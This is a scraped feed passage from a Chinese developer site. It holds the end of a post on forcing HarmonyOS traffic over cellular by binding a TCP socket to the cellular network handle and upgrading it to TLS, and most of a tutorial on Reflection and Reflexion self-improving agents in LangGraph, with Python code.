.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在用户同时开启 wifi/cellular 时，期望强行使用 cellular 访问网络，这是个比较常规的诉求。
鸿蒙提供了大量的 ets 网络基础库，本来以为能简单实现这个能力，却有些令人不解的坑。
作为基建来说，规避 ets 而直接使用 C++ 可能才是最优解。</p>
<h3 data-id="heading-0">获取蜂窝网络 IP</h3>
<p>第一个坑就是<code>connection.getAllNets()</code>接口在 wifi/cellular 同时开启时并不会返回 cellular 的<code>NetHandle</code>，仅开启 cellular 才能拿到其<code>NetHandle</code>。</p>
<p>但发现监听<code>NetConnection</code>的<code>netConnectionPropertiesChange</code>事件后，在网络不变化时，仅开启 wifi 会回调、仅开启 cellular 不回调、wifi/cellular 同时开启时会回调两个网卡的<code>NetHandle</code>。</p>
<p>这两个接口诡异的表现，结合起来却恰恰能拿到 cellular 的 <code>NetHandle</code>。</p>
<h3 data-id="heading-1">Socket 指定本地 IP</h3>
<p>第二个坑是<code>socket.TCPSocket</code>的<code>bind</code>操作是个虚假接口，意味着它并不会使用你传入的 IP 去绑定，难以理解设计者的初衷，经过与鸿蒙侧的沟通，这似乎不是必须解决的问题，也给不出有效解决方案。</p>
<p>看遍 ets 网络文档，发现一些可行性。</p>
<p><code>socket.TLSSocket</code>是支持<code>bind</code>指定 IP 的，当它却不支持指定网卡（也就是<code>NetHandle</code>），无法构建成功。
而<code>socket.TCPSocket</code>是支持指定网卡的，且提供了一个将 TCP 升级到 TLS 的接口：<code>constructTLSSocketInstance(tcpSocket: TCPSocket)</code>。</p>
<p>是的，又是一些诡异的设计和表现，但恰好能结合以实现我们的诉求，伪代码如下：</p>
<pre><code class="hljs language-scss" lang="scss">    <span class="hljs-comment">// 创建 TCP</span>
    let tcp: socket.TCPSocket = socket.<span class="hljs-built_in">constructTCPSocketInstance</span>();
    <span class="hljs-comment">// TCP bind 目标网卡 IP（虽然 bind 在底层什么都没做，但这一步仍然要做，不然后面 NetHandle bind 也可能出问题）</span>
    await tcp<span class="hljs-selector-class">.bind</span>({ address: cellular_ip });
    <span class="hljs-comment">// 把 TCP bind 到目标网卡（让 TCP 请求时使用目标网卡）</span>
    await handle<span class="hljs-selector-class">.bindSocket</span>(tcp);
    <span class="hljs-comment">// TCP 进行连接（不连接无法升级到 TLS）</span>
    await tcp<span class="hljs-selector-class">.connect</span>(options);
    <span class="hljs-comment">// TCP 升级到 TLS</span>
    let tlsSocket = socket<span class="hljs-selector-class">.constructTLSSocketInstance</span>(tcp);
    <span class="hljs-comment">// TLS 发起连接</span>
    await tlsSocket<span class="hljs-selector-class">.connect</span>(this.attr.connectOptions);
    <span class="hljs-comment">// 监听端口（必须在连接成功之后）</span>
    <span class="hljs-built_in">listenSocket</span>(tlsSocket);
    <span class="hljs-comment">// 发送数据</span>
    await tlsSocket<span class="hljs-selector-class">.send</span>(data);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于LangGraph的自我改进智能体：Reflection与Reflexion技术详解与实现]]></title>    <link>https://juejin.cn/post/7575159361904525353</link>    <guid>https://juejin.cn/post/7575159361904525353</guid>    <pubDate>2025-11-23T04:40:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575159361904525353" data-draft-id="7575442779038384170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于LangGraph的自我改进智能体：Reflection与Reflexion技术详解与实现"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-23T04:40:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="行者常至为者常成"/> <meta itemprop="url" content="https://juejin.cn/user/2068602958385020"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于LangGraph的自我改进智能体：Reflection与Reflexion技术详解与实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2068602958385020/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    行者常至为者常成
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:40:39.000Z" title="Sun Nov 23 2025 04:40:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">目录</h2>
<p>引言：什么是自我改进智能体？</p>
<p>一. Reflection智能体：自我批评的艺术</p>
<ul>
<li>核心概念</li>
<li>工作原理</li>
<li>Reflection模式工作流程</li>
<li>关键技术特征</li>
<li>LangGraph实现架构</li>
<li>代码实现核心</li>
<li>优势与特点</li>
</ul>
<p>二. Reflexion智能体：知识检索的智慧</p>
<ul>
<li>核心概念</li>
<li>工作原理</li>
<li>Reflexion模式工作流程</li>
<li>关键技术特征</li>
<li>LangGraph实现架构</li>
<li>代码实现核心</li>
<li>优势与特点</li>
</ul>
<p>三.两种智能体模式对比</p>
<ul>
<li>架构对比</li>
<li>性能对比表</li>
<li>选择策略</li>
</ul>
<p>四. 系统整体架构</p>
<p>五. 关键技术实现</p>
<ul>
<li>真正的流式输出架构</li>
<li>配置参数动态化</li>
<li>LangGraph工作流状态管理</li>
<li>Ollama本地模型集成</li>
</ul>
<p>六.性能优化策略</p>
<ul>
<li>流式输出性能优化</li>
<li>模型调用优化</li>
</ul>
<p>七.技术挑战与解决方案</p>
<p>八.应用输出示例</p>
<p>总结</p>
<p>源代码</p>
<h2 data-id="heading-1">引言：什么是自我改进智能体？</h2>
<p>在人工智能快速发展的今天，智能体系统已经从简单的指令响应演进为具备自我改进和学习能力的复杂系统。本文将深入探讨两种核心的自我改进智能体模式：<strong>Reflection（反思型）<strong>和</strong>Reflexion（递进式）</strong>，并详细介绍基于LangGraph框架的工程实现，包括系统架构设计、关键技术实现和性能优化策略。</p>
<p>传统的AI系统通常是一次性生成答案的模式："输入 → 处理 → 输出"。而自我改进智能体采用循环优化的思路："生成 → 评估 → 改进 → 再评估"，直到达到满意的结果。</p>
<p>这种设计理念来源于人类的学习过程：</p>
<ul>
<li>我们不是第一次就写出完美的文章</li>
<li>我们会先写个草稿，然后回顾、修改、再完善</li>
<li>有时会查阅资料、寻求建议，然后重新组织思路</li>
</ul>
<p>自我改进智能体正是将这种人类思维过程抽象为算法，让AI系统具备了持续改进的能力。</p>
<p><strong>首先我们看下系统实现的界面，对这两个模式的Agent，有个感性认识：</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88938b4703214b0093248ada041ca2b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=8BF1epKcWnRit1CWwPbnBXMdbSU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebb53c0e643548e390854f7f90c76dc5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=dqdJbr%2BrW7tJu0yTnDZrIGNB%2B0U%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e1845e874be4b10bd4ecfed84d098c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=8JUrkXHAWheIadmsz2tbRAlpkXw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8733058e5fd491db88fb96abce8f863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=23ZvbW0qt8zeUj8Je%2FVHWnMETfU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/083beefaa38f445d94bccb9737325b97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=NLgG0Z%2FGAOhN8LmNWfPdAaVYpM0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ea8adaf47fb4bc0a10c6b3cf3132329~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=cld9cyWiu%2FXS6iL5AcU1724%2B20U%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">一. Reflection智能体：自我批评的艺术</h2>
<h3 data-id="heading-3">核心概念</h3>
<p>Reflection智能体模拟了人类的自我批评过程。其核心思想是：<strong>让AI生成内容，然后让AI自己批评和改进这些内容</strong>。</p>
<h3 data-id="heading-4">工作原理</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/736d226553e04deb8d949b0b6bd8049c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=6jc9wjM5XM8CS6hjvRkJXD6wx9k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">Reflection模式工作流程</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7755e29d44ed4fa2b2d858ce4f43d786~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=RMhyc1pT3fDoZl91H%2F01wW5MwVc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">关键技术特征</h3>
<ol>
<li><strong>双重身份模式</strong>
<ul>
<li>生成者：负责创建初始内容</li>
<li>批评者：负责评估和改进内容</li>
</ul>
</li>
<li><strong>迭代改进循环</strong>
<ul>
<li>每次迭代都会产生批评意见</li>
<li>基于批评进行针对性改进</li>
<li>持续优化直到收敛</li>
</ul>
</li>
<li><strong>质量评估机制</strong>
<ul>
<li>设置收敛标准（如迭代次数、质量分数）</li>
<li>智能体自主判断是否需要继续改进</li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">LangGraph实现架构</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4abf8c73a35d4174a872a918b253e79b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=xTuB04ge%2FDgEY6p6R%2BBpZ5c7Nxo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">代码实现核心</h3>
<p>从项目源码中可以看到，Reflection智能体的核心实现包含：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">    @dataclass</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflectionState</span>:
        <span class="hljs-string">"""Reflection智能体状态"""</span>
        messages: <span class="hljs-type">List</span>[BaseMessage]          <span class="hljs-comment"># 消息历史</span>
        original_input: <span class="hljs-built_in">str</span>                  <span class="hljs-comment"># 原始输入</span>
        iteration_count: <span class="hljs-built_in">int</span>                 <span class="hljs-comment"># 迭代次数</span>
        final_output: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]          <span class="hljs-comment"># 最终输出</span>
        critique_history: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]          <span class="hljs-comment"># 批评历史</span>
        improvement_history: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]       <span class="hljs-comment"># 改进历史</span>
        is_converged: <span class="hljs-built_in">bool</span>                   <span class="hljs-comment"># 是否收敛</span>
        error_message: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]         <span class="hljs-comment"># 错误信息</span>
</code></pre>
<p>关键工作流程节点：</p>
<p><strong>1. 生成节点（generate_content）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_content_node</span>(<span class="hljs-params">self, state: ReflectionState</span>) -&gt; ReflectionState:
        <span class="hljs-string">"""内容生成节点"""</span>
        messages = [
            SystemMessage(content=self.generation_prompt),
            HumanMessage(content=state.original_input)
        ]
        
        response = <span class="hljs-keyword">await</span> self.llm_manager.generate(
            LLMRequest(messages=messages, **self.config.get(<span class="hljs-string">"generation"</span>, {}))
        )
        
        state.messages.append(AIMessage(content=response.content))
        <span class="hljs-keyword">return</span> state
</code></pre>
<p><strong>2. 批评节点（critique_content）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_critique_content_node</span>(<span class="hljs-params">self, state: ReflectionState</span>) -&gt; ReflectionState:
        <span class="hljs-string">"""自我批评节点"""</span>
        critique_prompt = self._build_critique_prompt(state)
        
        response = <span class="hljs-keyword">await</span> self.llm_manager.generate(
            LLMRequest(messages=[HumanMessage(content=critique_prompt)])
        )
        
        state.critique_history.append(response.content)
        <span class="hljs-keyword">return</span> state
</code></pre>
<p><strong>3. 改进节点（improve_content）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_improve_content_node</span>(<span class="hljs-params">self, state: ReflectionState</span>) -&gt; ReflectionState:
        <span class="hljs-string">"""内容改进节点"""</span>
        improvement_prompt = self._build_improvement_prompt(state)
        
        response = <span class="hljs-keyword">await</span> self.llm_manager.generate(
            LLMRequest(messages=[HumanMessage(content=improvement_prompt)])
        )
        
        state.improvement_history.append(response.content)
        state.messages.append(AIMessage(content=response.content))
        state.iteration_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> state
</code></pre>
<h3 data-id="heading-9">优势与特点</h3>
<p><strong>优势：</strong></p>
<ul>
<li>简单直接，无需外部数据源</li>
<li>迭代速度较快，资源消耗相对较低</li>
<li>适合内容生成和优化任务</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>文章写作和编辑</li>
<li>代码生成和优化</li>
<li>创意内容产出</li>
<li>简单的问题解答</li>
</ul>
<h2 data-id="heading-10">二. Reflexion智能体：知识检索的智慧</h2>
<h3 data-id="heading-11">核心概念</h3>
<p>Reflexion智能体在Reflection基础上增加了外部知识检索能力。其核心思想是：<strong>不仅自我批评，还要主动寻求外部知识和专业建议</strong>。</p>
<h3 data-id="heading-12">工作原理</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37cdfa7059344743bab78abc453b64a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=OIsJRX9t80UC8eZiObqp9Ql9hKg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">Reflexion模式工作流程</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf34f0be7e1c44e1896ae38781a8ceea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=5jzOjRKdlMTnsau%2FfAX59BMhPSA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">关键技术特征</h3>
<ol>
<li><strong>三元角色模式</strong>
<ul>
<li>生成者：创建初始响应</li>
<li>自我反思者：识别知识缺口</li>
<li>外部知识整合者：搜集和整合外部信息</li>
</ul>
</li>
<li><strong>知识检索循环</strong>
<ul>
<li>自动识别需要补充的知识点</li>
<li>主动搜索相关资料</li>
<li>将外部知识整合到响应中</li>
</ul>
</li>
<li><strong>智能查询生成</strong>
<ul>
<li>分析当前响应的不足</li>
<li>生成精准的搜索查询</li>
<li>评估知识源的可靠性</li>
</ul>
</li>
</ol>
<h3 data-id="heading-15">LangGraph实现架构</h3>
<p>Reflexion智能体的LangGraph实现更加复杂，包含知识检索子图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c11e99f22de481f808afbf2b68b3d18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=3OI2YASL6vMnnftmGStmG0ZOr1Q%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">代码实现核心</h3>
<p>Reflexion智能体的状态管理更加复杂：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">    @dataclass</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReflexionState</span>:
        <span class="hljs-string">"""Reflexion智能体状态"""</span>
        messages: <span class="hljs-type">List</span>[BaseMessage]           <span class="hljs-comment"># 消息历史</span>
        original_input: <span class="hljs-built_in">str</span>                   <span class="hljs-comment"># 原始输入</span>
        current_iteration: <span class="hljs-built_in">int</span>               <span class="hljs-comment"># 当前迭代次数</span>
        initial_response: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]      <span class="hljs-comment"># 初始响应</span>
        self_reflection: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]       <span class="hljs-comment"># 自省内容</span>
        search_queries: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]            <span class="hljs-comment"># 搜索查询</span>
        external_knowledge: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]       <span class="hljs-comment"># 外部知识</span>
        final_response: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]        <span class="hljs-comment"># 最终响应</span>
        knowledge_sources: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]         <span class="hljs-comment"># 知识来源</span>
        is_converged: <span class="hljs-built_in">bool</span>                   <span class="hljs-comment"># 是否收敛</span>
        error_message: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>]         <span class="hljs-comment"># 错误信息</span>
</code></pre>
<p>核心工作节点包括：</p>
<p><strong>1. 自省分析节点（self_reflect）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_self_reflect_node</span>(<span class="hljs-params">self, state: ReflexionState</span>) -&gt; ReflexionState:
        <span class="hljs-string">"""自省分析节点"""</span>
        reflection_prompt = <span class="hljs-string">f"""
        请分析以下响应的不足之处：
        
        用户输入：<span class="hljs-subst">{state.original_input}</span>
        当前响应：<span class="hljs-subst">{state.initial_response}</span>
        
        请识别：
        1. 响应中的知识缺口
        2. 需要进一步查证的细节
        3. 可以改进的具体方面
        """</span>
        
        response = <span class="hljs-keyword">await</span> self.llm_manager.generate(
            LLMRequest(messages=[HumanMessage(content=reflection_prompt)])
        )
        
        state.self_reflection = response.content
        <span class="hljs-keyword">return</span> state
</code></pre>
<p><strong>2. 知识检索节点（search_knowledge）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_search_knowledge_node</span>(<span class="hljs-params">self, state: ReflexionState</span>) -&gt; ReflexionState:
        <span class="hljs-string">"""知识检索节点"""</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> state.search_queries:
            <span class="hljs-keyword">return</span> state
        
        <span class="hljs-comment"># 使用知识检索器搜索外部信息</span>
        knowledge_results = <span class="hljs-keyword">await</span> self.knowledge_retriever.search_external_knowledge(
            state.search_queries
        )
        
        state.external_knowledge.extend(knowledge_results)
        <span class="hljs-keyword">return</span> state
</code></pre>
<p><strong>3. 知识整合节点（integrate_knowledge）</strong></p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">_integrate_knowledge_node</span>(<span class="hljs-params">self, state: ReflexionState</span>) -&gt; ReflexionState:
        <span class="hljs-string">"""知识整合节点"""</span>
        integration_prompt = self._build_integration_prompt(state)
        
        response = <span class="hljs-keyword">await</span> self.llm_manager.generate(
            LLMRequest(messages=[HumanMessage(content=integration_prompt)])
        )
        
        state.final_response = response.content
        <span class="hljs-keyword">return</span> state
</code></pre>
<h3 data-id="heading-17">优势与特点</h3>
<p><strong>优势：</strong></p>
<ul>
<li>能够获取最新的外部知识</li>
<li>响应更加准确和全面</li>
<li>适合复杂和专业化的问题</li>
</ul>
<p><strong>适用场景：</strong></p>
<ul>
<li>技术问题解答</li>
<li>学术研究和分析</li>
<li>专业领域咨询</li>
<li>事实性问题的回答</li>
</ul>
<h2 data-id="heading-18">两种智能体模式对比</h2>
<h3 data-id="heading-19">架构对比</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c50d1cc3d5af4dd7b0c2ef2068beeaaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KGM6ICF5bi46Iez5Li66ICF5bi45oiQ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478439&amp;x-signature=xHi%2Ft1TtECDG8O38v4o5tgR%2BPgo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-20">性能对比表</h3>








































<table><thead><tr><th>特性</th><th>Reflection</th><th>Reflexion</th></tr></thead><tbody><tr><td><strong>响应速度</strong></td><td>较快</td><td>较慢</td></tr><tr><td><strong>准确性</strong></td><td>较高</td><td>高</td></tr><tr><td><strong>知识深度</strong></td><td>基础</td><td>深度</td></tr><tr><td><strong>资源消耗</strong></td><td>较低</td><td>较高</td></tr><tr><td><strong>适用范围</strong></td><td>通用</td><td>专业</td></tr><tr><td><strong>实时性</strong></td><td>高</td><td>中等</td></tr></tbody></table>
<h3 data-id="heading-21">选择策略</h3>
<p><strong>选择Reflection的场景：</strong></p>
<ul>
<li>内容创作和编辑</li>
<li>创意性工作</li>
<li>快速响应需求</li>
